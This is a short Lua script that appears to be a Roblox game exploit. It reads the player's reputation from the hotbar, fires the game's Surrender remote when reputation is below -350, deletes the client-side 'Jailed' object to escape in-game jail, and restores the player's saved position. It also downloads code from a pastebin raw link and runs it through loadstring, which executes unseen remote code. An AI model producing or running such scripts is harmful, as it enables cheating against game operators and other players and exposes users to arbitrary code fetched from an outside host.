local spos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
wait(0.05)
for i = 1,10 do
    local repp = tostring(game.Players.LocalPlayer.PlayerGui.MainGui.UI.Hotbar.RepBar.Back.Amount.Text)
    local NS = string.gsub(repp, ",", "")
    local reppp = tonumber(NS)
    print(reppp)
    if reppp < -350 then
        print("attempting to surrender")
        game:GetService("ReplicatedStorage").RS.Remotes.Combat.Surrender:FireServer()
        game.Players.LocalPlayer.Character:WaitForChild("Jailed",8)
        if game.Players.LocalPlayer.Character:FindFirstChild("Jailed") then
            game.Players.LocalPlayer.Character.Jailed:Destroy()
            wait(0.1)
        end
    end
end
pcall(function()
loadstring(game:HttpGet(('https://pastebin.com/raw/errZFBHk'),true))()
end)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = spos